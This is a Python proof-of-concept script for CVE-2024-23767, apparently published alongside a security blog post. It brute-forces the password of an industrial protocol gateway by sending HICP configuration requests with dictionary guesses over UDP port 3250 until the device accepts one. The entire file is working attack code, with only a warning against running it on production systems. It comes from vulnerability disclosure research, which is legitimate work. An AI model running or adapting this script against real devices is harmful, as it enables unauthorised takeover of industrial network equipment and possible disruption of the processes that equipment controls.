# Lex @ https://github.com/claire-lex
# Script for CVE-2024-23767
# HICP password bruteforce
# Details: https://sensepost.com/blog/2024/targeting-an-industrial-protocol-gateway/

from sys import argv
from os import geteuid
from time import sleep
from getpass import getpass
from socket import gaierror
from scapy.compat import raw
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff, AsyncSniffer
from hicp import HICPModuleScan, HICPConfigure

# Arguments check
if len(argv) != 4:
    print("Usage: {0} ip_address dictionary iface".format(argv[0]))
    exit(-1)

# Privileges check
if geteuid() != 0:
    print("The program requires root privileges! Please run again with sudo.")
    exit(-1)
    
# Warning and check
print("WARNING!!! AVOID USING THIS IN RUNNING PRODUCTION ENVIRONMENTS")
check = input("Are you sure you want to proceed? [y/N]: ")
if check not in ["y", "Y"]:
    exit(0)

# Prepare request
filter = "src host {0} and port 3250".format(argv[1])
listener = AsyncSniffer(iface=argv[3], filter=filter, count=1)
target = IP(dst=argv[1])/UDP(dport=3250, sport=3250)

# Retrieve required information about the current configuration
try:
    listener.start()
    send(target/HICPModuleScan(), verbose=False)
except gaierror:
    print("IP address is invalid ({0}).".format(argv[1]))
    exit(-1)
try:
    listener.join()
    resp = listener.results[0]
    if resp.hicp_command != b"Module scan response":
        print("The response is not the one we expected, please try again.")
        exit(-1)
except IndexError:
    print("The device is not reachable.")
    exit(-1)
except TypeError:
    print("Network error (do you use the right interface?)")
    exit(-1)

# Is password protection enabled?
if resp.password == b"OFF":
    print("The device does not seem to be password-protected.")
    exit(0)

# Prepare the configuration request
# Keep the same values so that we test passwords without changing anything.
conf = HICPConfigure(
    target=resp.mac_address,
    ip_address=resp.ip_address,
    subnet_mask=resp.subnet_mask,
    gateway_address=resp.gateway_address,
    dhcp=resp.dhcp,
    hostname=resp.hostname,
    dns1=resp.dns1,
    dns2=resp.dns2
)

# Now we read the dictionary file and send one request per line.
with open(argv[2], 'r') as fd:
    for line in fd:
        sleep(0.2) # Need time to process requests
        conf.password = line.strip()
        print("\rTesting: ", line.strip(), " " * 10, end="")
        listener.start()
        send(target/conf, verbose=False)
        listener.join()
        resp = listener.results[0]
        if resp.hicp_command == b"Reconfigured":
            print("\nThe password is: ", line.strip())
            exit(0)
print("\nThe password was not found.")
